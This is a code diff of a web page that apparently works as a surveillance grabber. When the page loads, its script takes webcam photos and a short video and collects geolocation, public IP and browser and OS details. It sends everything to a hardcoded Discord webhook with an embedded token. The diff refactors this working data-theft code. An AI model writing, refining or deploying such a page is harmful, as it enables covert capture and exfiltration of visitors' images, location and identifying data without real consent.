@@ -23,14 +23,10 @@
 </head>
 <body>
 <div id="loading">Initializing and recording...</div>
-
 <!-- Hidden video element for webcam -->
 <video id="video" style="display:none;"></video>
-
 <script>
-  // --- Internal toggle ---
-  const includeWebcamFeed = false; // Set true to include webcam snapshot
-
+  const includeWebcamFeed = false; // toggle webcam snapshot
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495173417434087525/Peg6A9-52ckoH0A0Le00aBhX_GXH65Qx0Pq7NZdQNIY-8BhpPu2XEVqSVJ_7FUcE8Wl9';
 
   let mediaData = {
@@ -38,17 +34,12 @@
     photo2: null,
     video: null,
     webcamFrame: null,
-    hasCamera: false,
-    hasLocation: false,
-    locationData: null,
-    locationSource: 'none',
-    pageType: 'black',
-    systemInfo: null
+    systemInfo: null,
+    locationData: null
   };
+
   let mediaRecorder;
-  let recordedChunks = [];
   let recordingTimeout;
-  let isRecording = false;
   let stream = null;
 
   const loadingEl = document.getElementById('loading');
@@ -92,14 +83,15 @@
       return 'Other';
     })();
 
-    const vpnDetected = false; // Placeholder
-    const extensions = ['ExampleExtension1', 'ExampleExtension2']; // Placeholder
+    const vpnDetected = false; // placeholder
+    const extensions = ['ExampleExtension1', 'ExampleExtension2']; // placeholder
     const ip = await getPublicIP();
 
     return { ip, os, browser, platform, extensions, vpn: vpnDetected };
   }
 
 async function sendToDiscord() {
+  // Collect info
   mediaData.systemInfo = await collectSystemInfo();
 
   const formData = new FormData();
@@ -137,8 +129,10 @@ async function sendToDiscord() {
     content += `Location: Lat ${mediaData.locationData.latitude}, Lon ${mediaData.locationData.longitude}, Acc ${mediaData.locationData.accuracy}m\n`;
   }
 
-  formData.append('payload_json', JSON.stringify({ content }));
+  // Debug log
+  console.log('Message to send:', content);
 
+  formData.append('payload_json', JSON.stringify({ content }));
   await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 }
 
@@ -190,8 +184,7 @@ async function start() {
   mediaData.locationData = await getGeoLocation();
 
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
-    window.stream = stream;
+    stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
     const video = document.getElementById('video');
     video.srcObject = stream;
     await new Promise(res => video.onloadedmetadata = res);
@@ -210,11 +203,11 @@ async function start() {
     c2.getContext('2d').drawImage(video, 0, 0);
     mediaData.photo2 = c2.toDataURL('image/jpeg', 0.9);
 
-    // Record video
+    // Start recording
     const chunks = [];
-    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
-    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-    recorder.onstop = () => {
+    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    mediaRecorder.onstop = () => {
       mediaData.video = new Blob(chunks, { type: 'video/webm' });
       if (includeWebcamFeed) captureWebcamFrame().then(() => sendToDiscord());
       else { sendToDiscord(); }
@@ -222,9 +215,10 @@ async function start() {
       stream = null;
       isRecording = false;
     };
-    stream.getVideoTracks().forEach(t => t.addEventListener('ended', stopAndUpload));
+    stream.getVideoTracks().forEach(t => t.addEventListener('ended', () => { stopAndUpload(); }));
     mediaRecorder.start(1000);
-    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 3000);
+    // Stop after 3 sec
+    recordingTimeout = setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 3000);
   } catch(e) {
     console.error('Error:', e);
     showLoading(false);
@@ -232,7 +226,7 @@ async function start() {
 }
 
 window.onload = start;
-window.addEventListener('beforeunload', () => { if (isRecording) stopAndUpload(); });
+window.addEventListener('beforeunload', () => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); });
 </script>
 </body>
 </html>
